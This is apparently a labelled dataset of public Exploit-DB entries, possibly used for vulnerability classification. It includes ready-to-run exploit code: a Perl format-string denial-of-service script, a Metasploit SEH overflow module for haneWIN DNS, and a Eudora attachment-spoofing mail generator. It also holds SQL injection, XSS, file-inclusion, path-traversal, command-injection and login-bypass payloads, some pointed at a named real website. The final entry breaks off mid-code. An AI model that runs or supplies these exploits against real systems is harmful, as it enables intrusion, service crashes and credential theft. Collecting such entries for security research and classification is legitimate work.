33778,"Remote Help HTTP 0.0.7 - GET Format String Denial of Service source: https://www.securityfocus.com/bid/38875/info  Remote Help is prone to a denial-of-service vulnerability.  Remote attackers can exploit this issue to cause the application to crash, denying service to legitimate users. Due to the nature of this issue arbitrary code-execution may be possible; however this has not been confirmed.  Remote Help 0.0.7 is vulnerable; other versions may also be affected.   # Exploit Title : Remote Help 0.0.7 Remote DoS # Date          : 20 Mar 2010 # Author        : Rick2600 (ricks2600[at]gmail{dot}com) # Bug found by  : Rick2600 # Software Link : http://www.softpedia.com/progDownload/Remote-Help-Download-144888.html # Version       : 0.0.7 # OS            : Windows # Tested on     : XP SP2 En # Type of vuln  : DoS # Greetz to     : Corelan Security Team : http://www.corelan.be:8800/index.php/security/corelan-team-members/ # # Script provided 'as is', without any warranty. # Use for educational purposes only. # # # Code : print ""|------------------------------------------------------------------|\n""; print ""|                         __               __                       |\n""; print ""|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n""; print ""|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n""; print ""| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n""; print ""| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n""; print ""|                                                                  |\n""; print ""|                                       http://www.corelan.be:8800 |\n""; print ""|                                                                  |\n""; print ""|-------------------------------------------------[ EIP Hunters ]--|\n\n""; print ""[+] DoS exploit for Remote Help 0.0.7 Http\n"";  use IO::Socket;  if ($#ARGV != 0) {     print $#ARGV;     print ""\n  usage: $0 <targetip>\n"";     exit(0); }   print ""[+] Connecting to server $ARGV[0] on port 80\n\n"";  $remote = IO::Socket::INET->new( Proto => ""tcp"",  if ($#ARGV != 0) {     print $#ARGV;     print ""\n  usage: $0 <targetip>\n"";     exit(0); }   print ""[+] Connecting to server $ARGV[0] on port 80\n\n"";  $remote = IO::Socket::INET->new( Proto => ""tcp"",                                  PeerAddr  => $ARGV[0],                                  PeerPort  => ""http(80)"", ); unless ($remote) { die ""Cannot connect to Remote Help daemon on $ARGV[0]\n"" } print ""[+] Connected!\n"";   #CONTROL EAX $payload = ""/index.html"" . ""%x"" x 90 . ""A"" x 250 . ""%x"" x 186  .""%.999999x"" x 15 .""%.199999x""  . ""%nX"" . ""DCBA"";   print ""[+] Sending Malicious Request\n""; print $remote ""GET $payload HTTP/1.1\r\n""; close $remote;",GET Format String Denial of Service,1
22273,"Zlib 1.1.4 - Compression Library 'gzprintf()' Buffer Overrun (1) // source: https://www.securityfocus.com/bid/6913/info  A buffer-overrun vulnerability has been reported in the Zlib compression library. Due to the use of 'vsprintf()' by an internal Zlib function, an attacker can cause memory to become corrupted. This buffer overrun occurs becuase the software fails to check the boundaries of user-supplied data given to the 'gzprintf()' function.  Successful exploitation of this vulnerability may allow an attacker to execute arbitrary instructions.  Note that only Zlib 1.1.4 has been reported vulnerable to this issue. It is not yet known whether earlier versions are also affected.   #include <zlib.h>     #include <errno.h>     #include <stdio.h>      int main(void) {       gzFile f;       int ret;        if(!(f = gzopen(""/dev/null"", ""w""))) {         perror(""/dev/null"");         exit(1);       }       ret = gzprintf(f, ""%10240s"", """");       printf(""gzprintf -> %d\n"", ret);       ret = gzclose(f);       printf(""gzclose -> %d [%d]\n"", ret, errno);       exit(0);     }",Buffer Overrun,1
42723,"haneWIN DNS Server 1.5.3 - Remote Buffer Overflow (Metasploit) require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'haneWIN DNS Server Buffer Overflow', 			'Description'	=> %q{ 				This module exploits a buffer overflow vulnerability found in 				haneWIN DNS Server <= 1.5.3. The vulnerability is triggered 				by sending an overly long packet to the victim server. A memcpy 				function blindly copies user supplied data to a fixed size buffer 				leading to remote code execution.   				This module was tested against haneWIN DNS 1.5.3 			}, 			'Author' => [ 'james fitts' ], 			'License' => MSF_LICENSE, 			'References' => 				[ 					[ 'EDB', '31260' ], 					[ 'OSVDB', '102773' ] 				], 			'Privileged'  => false, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload' => 				{ 					'Space'	=> 1000, 					'DisableNops' => true, 					'BadChars' => ""\x00\x0a\x0d\x20"", 					'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500 				}, 			'Platform' => 'win', 			'DefaultTarget'	=> 0, 			'Targets' => 				[ 					[ 						'Windows 2000 SP4 EN / haneWIN DNS 1.5.3', 						{ 							# msvcrt.dll v6.10.9844.0 							# pop esi/ pop edi/ retn 							'Ret' => 0x78010394, 						} 					] 				], 			'DisclosureDate' => 'Jul 27 2013'))  			register_options([Opt::RPORT(53)], self.class) 	end  	def exploit 		connect  		p = make_nops(32) + payload.encoded  		buf = Rex::Text.pattern_create(5000) 		buf[0, 2] = [0x4e20].pack('n')							# length for malloc 		buf[1332, p.length] = p 		buf[2324, 8] = generate_seh_record(target.ret) 		buf[2332, 15] = make_nops(10) + ""\xe9\x13\xfc\xff\xff""	# jmp $-1000   		print_status(""Sending malicious request..."") 		sock.put(buf) 		disconnect  	end end",Remote Buffer Overflow,1
45974,"IceWarp Mail Server 11.0.0.0 - Cross-Site Scripting Disclaimer: [This code is for Educational Purposes , I would Not be responsible   for any misuse of this code]  Attack type : Remote Patch Status : Unpatched Exploitation : # Author: Usman Saeed # Company: Xc0re Security Research Group # Website: http://www.xc0re.net # Twitter : http://twitter.com/emuess # Original Advisory DATE: [29/01/2014] # Publishing of Exploit Date : [17/02/2014]  Description =========== It is possible to inject malicious HTML Elements into the email and   cause a Cross site Scripting (XSS) payload to be executed.  Tested ICEWARP Client Versions (http://www.icewarp.com/) ============================ Version : 11.0.0.0 (2014-01-25) x64 & 10.3.4  Browser Used ============= Mozilla Firefox 26.0  Proof Of Concept ============ Please find the details about the exploit : http://xc0re.net/blog/?p=363  Proof Of Concept ================= For Version: ICEWARP 11.0.0  ><object data=”data:text/html;base64,PC9zY3JpcHQ+PGltZyBzcmM9Ing6eCIgb25lcnJvcj0iYWxlcnQoU3RyaW5nLmZyb21DaGFyQ29kZSg4OCwxMTUsMTE1KSkiIC8+”></object>>  ><EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==” type=”image/svg+xml” AllowScriptAccess=”always”></EMBED>>  Note:  For Version: ICEWARP 10.3.4  <EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==” type=”image/svg+xml” AllowScriptAccess=”always”></EMBED>",Cross site Scripting (XSS),1
39564,"AKIPS Network Monitor 15.37 through 16.5 - OS Command Injection # Exploit Title: AKIPS Network Monitor 15.37-16.6 OS Command Injection # Date: 03-14-2016 # Exploit Author: BrianWGray # Contact: https://twitter.com/BrianWGray  # WebPage: http://somethingbroken.com/ # Vendor Homepage: https://www.akips.com/ # Software Link: https://www.akips.com/showdoc/download # Version: 15.37 through 16.5, May impact earlier versions, remediated in 16.6 # Tested on: FreeBSD 10.2-RELEASE-p7 # CVE : N/A  1. Description  The ""username"" login parameter allows for OS Command injection via command Injection during a failed login attempt returns the command injection output to a limited login failure field.  By using concatenation '||' a command may be appended to the username.  The vendor has stated the following: ""Apparently the issue is in a Perl module which does an open2() of a custom PAM program.  The command is not being properly sanitised."" - Vendor Reply   http://somethingbroken.com/vuln/0002.html  2. Proof of Concept  example request:  curl 'https://Application/' --data 'username=%7C%7C+whoami&password=' --compressed --insecure -# | grep -wF ""Error signing in:""    example response:   <div class=""alert alert-warning""><strong>Error signing in:</strong> akips</div>   3. Solution: Update to version 16.6 https://www.akips.com/showdoc/download   4. Timeline:  * 03-14-2016: Discovered, Vendor Notified, Vendor Response * 03-15-2016: Vendor Releases Remediated Build 16.6",OS Command Injection,1
8097,"MLdonkey 2.9.7 - Arbitrary File Disclosure MLdonkey (up to 2.9.7) has  a  vulnerability  that allows remote user to access any file   with   rights   of  running  Mldonkey  daemon  by  supplying  a special-crafted  request  (ok,  there's  not much special about double slash) to an Mldonkey http GUI (tcp/4080 usually).  Reference: https://savannah.nongnu.org/bugs/?25667  Thus, the exploit would be as simple as accessing any file on a remote host with your browser and double slash:  http://mlhost:4080//etc/passwd  # milw0rm.com [2009-02-23]",Arbitrary File Disclosure,1
27662,Blursoft Blur6ex 0.3.462 - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/17554/info  Blur6ex is prone to a local file-include vulnerability that may allow an unauthorized user to view files and to execute local scripts.  http://www.example.com/blur6ex-0.3.462/index.php?shard=/../../../../../[local-file]%00,Local File Inclusion,1
3503,MPM Chat 2.5 - 'view.php?logi' Local File Inclusion # MPM Chat 2.5 (view.php logi) Local File Include Exploit # D.Script: http://mpm.pahviloota.net/mpm_chat_25.zip # Discovered by: GloD_M = [Mahmood_ali] # Homepage: http://www.Tryag.cc # Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group # V.Code <?php if ($logi != '') { include 'archive/' . $logi; #Exploit: /[path]/view.php?logi=../../../../../etc/passwd  # milw0rm.com [2007-03-17],Local File Inclusion,1
24906,"AWS Xms 2.5 - 'importer.php?what' Directory Traversal Advisory ID: HTB23147 Product: AWS XMS Vendor: http://www.aws-dms.com Vulnerable Version(s): 2.5 and probably prior Tested Version: 2.5 Vendor Notification: March 6, 2013  Vendor Patch: March 16, 2013  Public Disclosure: March 27, 2013  Vulnerability Type: Path Traversal [CWE-22] CVE Reference: CVE-2013-2474 Risk Level: Medium  CVSSv2 Base Score: 5 (AV:N/AC:L/Au:N/C:P/I:N/A:N) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered path traversal vulnerability in AWS XMS, which can be exploited to read contents of arbitrary files.   1) Path Traversal in AWS XMS: CVE-2013-2474  The vulnerability exists due to insufficient filtration of ""what"" HTTP GET parameter passed to ""/importer.php"" script before using it in PHP ""file()"" function. A remote attacker can read contents of arbitrary files on the target system.  The vulnerable script sets ""text/javascript"" Content-Type for the output data, which makes exploitation of the vulnerability via a web browser inconvenient. Exploitation via telnet or wget utilities is easier.   The following PoC (Proof of Concept) code uses wget utility to download source code of ""/default.php"" file, which contains application configuration data and administrator’s credentials:   wget http://[host]/importer.php?what=defaults.php%00.js   To bypass protections against NULL-byte injection (implemented in PHP 5.3.4 and later versions) or enabled ""magic_quotes_gpc"", alternative techniques based on path normalization and length restrictions can be used.  The second PoC code uses a large amount of '/' symbols (4096 is sufficient for the majority of platforms) to bypass the restrictions and get source code of the ""/default.php"" file:   wget http://[host]/importer.php?what=defaults.php///////...//////.js   -----------------------------------------------------------------------------------------------  Solution:  Upgrade to AWS XMS 2.6  More Information: http://www.aws-dms.com/temp.php?use=templates/download.xml#xms-2.6  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23147 - https://www.htbridge.com/advisory/HTB23147 - Path Traversal in AWS XMS. [2] AWS XMS - http://www.aws-dms.com/ - XMS is an online visual web development enviroment and framework, providing a web application base, with multi language support, based on XML. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.   -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",Directory Traversal,1
32191,"PHP-Nuke Kleinanzeigen Module - 'lid' SQL Injection source: https://www.securityfocus.com/bid/30577/info  The Kleinanzeigen module for PHP-Nuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/modules.php?name=Kleinanzeigen&a_op=visit&lid=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2Caid%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors%2F%2A%2A%2Fwhere%2F%2A%2A%2Fradminsuper%3D1%2F%2A http://www.example.com/modules.php?name=Kleinanzeigen&a_op=visit&lid=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2Cpwd%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors%2F%2A%2A%2Fwhere%2F%2A%2A%2Fradminsuper%3D1%2F%2A",SQL Injection,1
20867,"ARCservIT 6.61/6.63 Client - asagent.tmp Arbitrary File Overwrite source: https://www.securityfocus.com/bid/2741/info  ARCservIT from Computer Associates contains a vulnerability which may allow malicious local users to overwrite arbitrary files.  When it runs for the first time, 'asagent', opens (and truncates it if it exists) a file in /tmp called 'asagent.tmp'. 'asagent' does not check to make sure that this file already exists or that is a symbolic link to another file.  This may allow malicious local users to overwrite critical system files.   As user:  je@boxname~> ln -s /etc/passwd /tmp/asagent.tmp  And root:  root@boxname# /usr/CYEagent/asagent start CA Universal Agent ADV v1.39 started on openview SunOS 5.8 Generic_108528-07 sun4u  ARCserveIT Universal Agent started...  Then,  je@boxname~> ls -la /etc/passwd -r--r--r-- 1 0 sys 0 May 9 11:59 /etc/passwd",Arbitrary File Overwrite,1
26684,"88Scripts Event Calendar 2.0 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/15658/info  88Scripts Event Calendar is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  Versions 2.0 and prior are reported to be vulnerable; other versions may also be affected.   http://www.example.com//index.php?d=28&m=[SQL]",SQL injection,1
8291,"acute control panel 1.0.0 - SQL Injection / Remote File Inclusion ############################################################### [+] Acute Control Panel 1.0.0 RFI/SQL Injection (Auth Bypass) [+] Discovered By SirGod [+] www.mortal-team.org [+] www.h4cky0u.org ###############################################################  [+] Remote File Inclusion   Vulnerable code in container.php  ----------------------------------------------------------- <?php include_once($theme_directory.""/sidebar.php""); ?> -----------------------------------------------------------   PoC :    http://127.0.0.1/themes/container.php?theme_directory=[Shell]%00  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   Vulnerable code in header.php  -------------------------------------------------------------- <?php include_once($theme_directory.""/navigation.php""); ?> --------------------------------------------------------------   PoC :    http://127.0.0.1/themes/header.php?theme_directory=[Shell]%00  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  [+] SQL Injection (Auth Bypass)   Vulnerable code in login.php  -------------------------------------------- $query = mysql_query(""SELECT id,username,password,email,fullname,permissions FROM `users` WHERE username='$username' AND password='$password'"", $conn) or die(mysql_error()); --------------------------------------------   PoC :    Username : admin ' or ' 1=1   Password : anything or nothing  ################################################################  # milw0rm.com [2009-03-26]",Remote File Inclusion,1
30367,Alstrasoft Sms Text Messaging Enterprise 2.0 - '/admin/membersearch.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/25022/info  SMS Text Messaging Enterprise is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/admin/membersearch.php?pagina=17&q=la&domain=Walltrapas.es%22%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E http://www.example.com/admin/membersearch.php?q=%22%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E&B1=Submit,Cross-Site Scripting,1
9588,"Mambo Component com_zoom - 'catid' Blind SQL Injection   Mambo component com_zoom (catid) Blind SQL injection                                       [_][-][X]        _  ___  _  ___      ___ ___ _____      __  ___ __   __  ___              | |/ / || |/ __|___ / __| _ \ __\ \    / / |_  )  \ /  \/ _ \             | ' <| __ | (_ |___| (__|   / _| \ \/\/ /   / / () | () \_, /             |_|\_\_||_|\___|    \___|_|_\___| \_/\_/   /___\__/ \__/ /_/                                                                                                                                                                     Red n'black i dress eagle on my chest.        It's good to be an ALBANIAN Keep my head up high for that flag i die.        Im proud to be an ALBANIAN    ###################################################################         								                  Author         	: boom3rang		 	                          Contact        	: boom3rang[at]live.com                                  Greetz   	: H!tm@N - KHG - cHs  		  R.I.P redc00de		              -------------------------------------------------------------------         								                             Affected software description    	                                <name>zoom</name>              <creationDate>20/01/2004</creationDate>              <author>Mike de Boer</author>              <authorEmail>mailme@mikedeboer.nl</authorEmail>              <authorUrl>www.mikedeboer.nl</authorUrl>              <version>2.0</version>			              -------------------------------------------------------------------         								               [~] SQLi :						                       								               http://www.TARGET.com/index.php?option=com_zoom&Itemid=0&catid=[SQLi]                                                                                  [~]Google Dork :		   				                            inurl:com_zoom inurl:""imgid""						         						              -------------------------------------------------------------------         								               [~] Table_NAME  =  mos_users     [~] Column_NAME =  username - password 			                  								              -------------------------------------------------------------------         								               [~] Admin Path :					                       								               http://www.TARGET.com/administrator     ===================================================================	 	                          = POC =    ===================================================================                   [~] Live Demo:     ttp://www.sandervalkema.com/index.php?option=com_zoom&Itemid=0&catid=21/**/and/**/1=1/*    --> True    ttp://www.sandervalkema.com/index.php?option=com_zoom&Itemid=0&catid=21/**/and/**/1=2/*    --> False     -------------------------------------------------------------------      [~] ASCII     index.php?option=com_zoom&Itemid=0&catid=21/**/and/**/ascii(substring((SELECT/**/concat(username,0x3a,password)/**/from/**/mos_users limit 0,1),1,1))>96     -------------------------------------------------------------------          [~] Live Demo ASCII        True    http://www.sandervalkema.com/index.php?option=com_zoom&Itemid=0&catid=21/**/and/**/ascii(substring((SELECT/**/concat(username,0x3a,password)/**/from/**/mos_users limit 0,1),1,1))>96		              False    http://www.sandervalkema.com/index.php?option=com_zoom&Itemid=0&catid=21/**/and/**/ascii(substring((SELECT/**/concat(username,0x3a,password)/**/from/**/mos_users limit 0,1),1,1))>97     Like we see, the first charter of username is 'a'	char(97)=a    Now you can change the second limit to find other charters, Good Luck...	  note: <name>zoom</name> <creationDate>20/01/2004</creationDate> <author>Mike de Boer</author> <authorEmail>mailme@mikedeboer.nl</authorEmail> <authorUrl>www.mikedeboer.nl</authorUrl> <version>2.0</version>  # milw0rm.com [2009-09-04]",Blind SQL Injection,1
21470,"NewAtlanta ServletExec/ISAPI 4.1 - File Disclosure source: https://www.securityfocus.com/bid/4795/info  ServletExec/ISAPI is a plug-in Java Servlet/JSP engine for Microsoft IIS. It runs with IIS on Microsoft Windows NT/2000/XP systems.  ServletExec/ISAPI will disclose the contents of arbitrary files within the webroot directory by sending a request containing URL encoded directory traversal sequences. While this will cause the software to serve files within wwwroot that normally would not be served, it does not appear possible to exploit this condition to break out of the webroot.  http://target/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5c\global.asa",File Disclosure,1
7629,"DDL-Speed Script - 'acp/backup' Admin Backup Bypass ######################################################################################################################## #DDL-Speed Script RFI Vulnerabilities											 #======================================================================================================================= #                                                                     							 #Critical Level : Dangerous                                           							 #                                                                     							 #Vendor site : http://ddl-speed.org/  ( Will be back soon)  								 #															 #Download : http://scriptmafia.org/cms/1766-ddl-speed.org-script-vom-30.03.2008.html					 #															 #======================================================================================================================= #															 #DORK : ""index.php?section=post_upload""                                       						 #                                                       								 #															 #															 #Exploit :														 #--------------------------------											 #															 #www.[URL]/[PATH]/acp/backup/log.php	 #www.[URL]/[PATH]/acp/backup/index.php #www.[URL]/[PATH]/acp/backup/acp.php										 #															 #======================================================================================================================= #Discovered by : #sys-flaw ( Quakenet)											 #															 #Contact : tmh[at]sys-flaw.com	/ admin[at]sys-flaw.com									 #															 #Greetz to :n00bor , Five-Three-Nine , J0hn.X3r , electron1x , PurpleD1amond , Sebo , Z1uX , meckl , Floo , -Patrick_B , #abcdef ,Loader007 , bizzit , Barbers , dev0815 , f0Gx , h0yt3r , Nemo , e-shock , Sys-Flaw , Codesoft ,Free-Hack 	 #	      														 #															 ########################################################################################################################  # milw0rm.com [2009-01-01]",Admin Backup Bypass,1
22627,"Qualcomm Eudora 5.2.1/6.0 - File Attachment Spoofing Variant source: https://www.securityfocus.com/bid/7653/info  Eudora is reported to be prone to an issue which may allow attackers to spoof the file extension in an attachment. This may aid an attacker in enticing a user of the e-mail client into executing malicious content.  It is possible to refer to other files or attachments in a message through specially formatted inline text.  If the CR (carriage return) character (0x0D, Ctrl-M) is embedded anywhere in the 'Attachment Converted' string, it is possible to execute message attachments without further user interaction.  #!/usr/bin/perl --  use MIME::Base64;  print ""From: me\n""; print ""To: you\n""; print ""Subject: Eudora 6.0 on Windows exploit\n""; print ""MIME-Version: 1.0\n""; print ""Content-Type: multipart/mixed; boundary=\""zzz\""\n""; print ""\n""; print ""This is a multi-part message in MIME format.\n""; print ""--zzz\n""; print ""Content-Type: text/plain\n""; print ""Content-Transfer-Encoding: 7bit\n""; print ""\n"";  print ""Pipe the output of this script into:   sendmail -i victim\n"";  print ""\nQuestion: Besides In.mbx, Eudora 6.0 also keeps In.mbx.001 and In.mbx.002 files. Any way to turn this wasteful feature off?\n"";  print ""\nWith spoofed attachments, we could 'steal' files if the message was forwarded (not replied to).\n"";  print ""\nSending a long filename e.g.:\n""; print ""Attachment Converted\r: \""\\AAA...AAA\""\n""; print ""(with 250 or so repetitions of \""A\"") makes Eudora crash. Eudora is then unable to start, until the offending message is removed from In.mbx (using some utility other than Eudora itself). This buffer overflow can easily be made into an execute-any-code exploit (but is not shown here for script kiddies).\n"";  print ""\nWithin plain-text email (or plain-text, inline MIME parts) embedded CR=x0d characters get converted internally into a NUL=x00 and ignored, so we can spoof \""attachment converted\"" lines:\n"";  print ""\nThe following work fine (but are boring and/or put up warnings):\n""; print ""Attachment Converted\r: \""c:\\winnt\\system32\\calc.exe\""\n""; print ""Attachment Converted\r: c:\\winnt\\system32\\calc.exe\n""; print ""(Note how JavaScript is done with IE, web with default browser Netscape)\n""; print ""Attachment Converted\r: <A href=javascript:alert(%27hello%27)>hello.txt</a>\n""; print ""Attachment Converted\r: <A href=http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx>web.txt</a>\n""; print ""Attachment Converted\r: <A href=c:/winnt/system32/calc.exe>file.txt</a>\n"";  print ""\nIf we can guess the full path to the attach directory then can change the name shown to anything we like, but get broken icon:\n""; print ""Attachment Converted\r: <A href=H:/windows/.eudora/attach/calc>file.txt</a>\n"";  print ""\nCuteness value only:\n""; print ""Attachment Converted\r: <A href=c:/winnt/system32/calc.exe>file1.txt</a> xyz <A href=c:/winnt/system32/calc.exe>file2.txt</a>\n"";  print ""\n<x-html> With <b>HTML</b> <i>inclusions</i> we can do <a href=c:/winnt/system32/calc.exe>file</a>, <a href=\""http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx\"">http</a> and <a href=\""javascript:alert(\x27hello\x27)\"">javascript</a> references. Any way to exploit this? </x-html>\n"";  print ""\n<x-rich> Can also do RTF inclusions. Can this be abused? </x-rich>\n"";  print ""\nThose <x-xyz></x-xyz> constructs allow spoofing attachments easily, without embedded CR:\n\n""; print ""HTML\n""; print ""<x-html></x-html>Attachment Converted: \""xyz\""\n""; print ""Rich\n""; print ""<x-rich></x-rich>Attachment Converted: \""xyz\""\n""; print ""Flowed\n""; print ""<x-flowed></x-flowed>Attachment Converted: \""xyz\""\n"";  print ""\n"";  print ""\n--zzz\n""; print ""Content-Type: text/plain; name=\""plain.txt\""\n""; print ""Content-Transfer-Encoding: 7bit\n""; print ""Content-Disposition: inline; filename=\""plain.txt\""\n""; print ""\n""; print ""Within a 'plain' attachment:\n""; print ""Attachment Converted\r: \""c:\\winnt\\system32\\calc.exe\""\n"";  print ""\n--zzz\n""; print ""Content-Type: text/plain; name=\""qp.txt\""\n""; print ""Content-Transfer-Encoding: quoted-printable \n""; print ""Content-Disposition: inline; filename=\""qp.txt\""\n""; print ""\n""; print ""Within quoted-printable encoded parts still need the embedded CR:\n""; print ""=41ttachment=20=43onverted\r=3a \""c:\\winnt\\system32\\calc.exe\""\n"";  print ""\n--zzz\n""; print ""Content-Type: text/plain; name=\""b64.txt\""\n""; print ""Content-Transfer-Encoding: base64\n""; print ""Content-Disposition: inline; filename=\""b64.txt\""\n""; print ""\n""; $z = ""Within base64 encoded (plain-text, inline) MIME parts, can spoof\r without embedded CR (but line termination is CR-NL):\r Attachment Converted: \""c:\\winnt\\system32\\calc.exe\""\r\n""; print encode_base64($z);  print ""\n--zzz--\n""; print ""\n"";",File Attachment Spoofing Variant,1
40467,"PHP Classifieds Rental Script - Blind SQL Injection [x]========================================================================================================================================[x]  | Title	: PHP Classifieds Rental Script Blind SQL Vulnerabilities  | Software	: PHP Classifieds Rental Script  | Vendor	: http://www.i-netsolution.com/  | Demo         : http://www.i-netsolution.com/item/php-classifieds-rental-script/244993  | Date         : 06 October 2016  | Author	: OoN_Boy [x]========================================================================================================================================[x]       [x]========================================================================================================================================[x]  | Technology		: PHP  | Database		: MySQL  | Price		: $ 99  | Description		: PHP Classifieds Rental Script The PHP Rental Classifieds Script is one among the limited software's, which are designed 			  so user-friendly that anyone with minimal knowledge of operating a computer can utilize it to its optimum. Besides being 			  an easy-to- use software, this Property Rental Script [x]========================================================================================================================================[x]     [x]========================================================================================================================================[x]  | Exploit	: http://localhost/product_details.php?refid=%Inject_Here%1319258872  | Aadmin Page	: http://localhost/[path]/admin/index.php   [x]========================================================================================================================================[x]       [x]========================================================================================================================================[x]  | Proof of concept : sqlmap -u ""http://localhost/product_details.php?refid=1319258872"" --invalid-string [x]========================================================================================================================================[x]    --- Parameter: refid (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: refid=1319258872' AND 3912=3912 AND 'HTMi'='HTMi      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 OR time-based blind     Payload: refid=1319258872' OR SLEEP(5) AND 'QwXZ'='QwXZ      Type: UNION query     Title: MySQL UNION query (NULL) - 26 columns     Payload: refid=xCUcyB' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a787671,0x644e6e5046537647684864705a527667796f454c666c4656644a73506d4e627a48574969424a4756,0x7176786271),NULL,NULL,NULL,NULL,NULL# ---   [x]========================================================================================================================================[x]       [x]========================================================================================================================================[x]  | Greetz	: antisecurity.org batamhacker.or.id  | 		  Vrs-hCk NoGe Jack zxvf Angela Zhang aJe H312Y yooogy mousekill }^-^{ martfella noname s4va  |		  k1tk4t str0ke kaka11 ^s0n g0ku^ Joe Chawanua Ntc xx_user s3t4n IrcMafia em|nem Pandoe Ronny rere [x]========================================================================================================================================[x]  [x]========================================================================================================================================[x] | Hi All long time no see ^_^ [x]========================================================================================================================================[x]",Blind SQL Injection,1
7640,"w3blabor CMS 3.3.0 - Authentication Bypass                           \#'#/                           (-.-)    ------------------oOO---(_)---OOo-----------------    |          __             __                     |    |    _____/ /_____ ______/ /_  __  ______ ______ |    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |    | Security Research Division      /____/ 2oo8    |    --------------------------------------------------    |   w3blabor CMS <= v3.3.0 Admin Login Bypass    |    |       (requires magic_quotes_gpc = Off)        |    -------------------------------------------------- [!] Discovered.: DNX [!] Vendor.....: http://www.w3blaborcms.de [!] Detected...: 20.12.2008 [!] Reported...: 20.12.2008 [!] Response...: 21.12.2008  [!] Background.: Sicher! Schnell! Einfach!                  Das CMS wurde durch diverse Abfragen und Konfigurationen gegen Hackangriffe                  abgesichert. Auch arbeitet es sehr stabil und kommuniziert schnell mit der                  angebundenen Datenbank. Die Verwaltung gestaltet sich als besonders einfach im                  Gegensatz zu vielen anderen Content Management Systemen - Und genau das macht                  es zu etwas Besonderem!  [!] Bug........: $_POST['benutzername'] & $_POST['passwort'] in admin/index.php near line 93                    93: if (isset($_GET['action']) && $_GET['action'] == ""login"" && $_POST['benutzername'] != """" && $_POST['passwort'] != """") {                   94:                   95:	$check = 